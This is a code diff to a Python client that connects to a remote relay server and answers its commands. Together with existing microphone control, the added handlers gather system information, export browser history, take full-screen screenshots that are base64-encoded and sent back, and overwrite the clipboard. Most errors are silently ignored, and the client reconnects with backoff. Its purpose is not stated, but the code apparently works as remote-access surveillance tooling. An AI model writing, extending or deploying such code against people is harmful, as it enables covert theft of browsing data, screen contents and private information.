@@ -238,15 +238,80 @@ def _make_client():
             try: _mic.stop()
             except Exception: pass
 
+    @sio.on("get_sysinfo")
+    def _on_get_sysinfo(data):
+        try:
+            import sysinfo
+            info = sysinfo.get_info()
+            info["_requester"] = data.get("_requester") if data else None
+            sio.emit("sysinfo_result", info)
+        except Exception:
+            pass
+
+    @sio.on("get_history")
+    def _on_get_history(data):
+        try:
+            import browser_history as bh
+            limit = (data or {}).get("limit", 500)
+            history = bh.export_all(limit=limit)
+            sio.emit("history_result", {
+                "history": history, "count": len(history),
+                "_requester": data.get("_requester") if data else None,
+            })
+        except Exception as e:
+            sio.emit("history_result", {
+                "error": str(e), "history": [], "count": 0,
+                "_requester": data.get("_requester") if data else None,
+            })
+
+    @sio.on("take_screenshot")
+    def _on_take_screenshot(data):
+        try:
+            import mss as _mss, base64 as _b64
+            from PIL import Image as _Img
+            import io as _io
+            with _mss.mss() as sct:
+                shot = sct.grab(sct.monitors[1])
+                img = _Img.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
+                buf = _io.BytesIO()
+                img.save(buf, format="PNG")
+                b64 = _b64.b64encode(buf.getvalue()).decode()
+                sio.emit("screenshot_result", {
+                    "data": b64,
+                    "_requester": data.get("_requester") if data else None,
+                })
+        except Exception as e:
+            sio.emit("screenshot_result", {
+                "error": str(e),
+                "_requester": data.get("_requester") if data else None,
+            })
+
+    @sio.on("clipboard_set")
+    def _on_clipboard_set(data):
+        try:
+            import pyperclip
+            pyperclip.copy(data.get("text", ""))
+            sio.emit("clipboard_set_result", {
+                "ok": True,
+                "_requester": data.get("_requester") if data else None,
+            })
+        except Exception as e:
+            sio.emit("clipboard_set_result", {
+                "ok": False, "error": str(e),
+                "_requester": data.get("_requester") if data else None,
+            })
+
     return sio
 
 
 def _connect_loop():
     import time
+    backoff = 5
     while True:
         sio = _make_client()
         try:
             sio.connect(RELAY_URL, transports=["websocket", "polling"])
+            backoff = 5
             sio.wait()
         except Exception as e:
             print(f"[relay] connection failed: {e}", flush=True)
@@ -254,8 +319,9 @@ def _connect_loop():
             sio.disconnect()
         except Exception:
             pass
-        print("[relay] reconnecting in 10s...", flush=True)
-        time.sleep(10)
+        print(f"[relay] reconnecting in {backoff}s...", flush=True)
+        time.sleep(backoff)
+        backoff = min(backoff * 2, 60)
 
 
 def run():
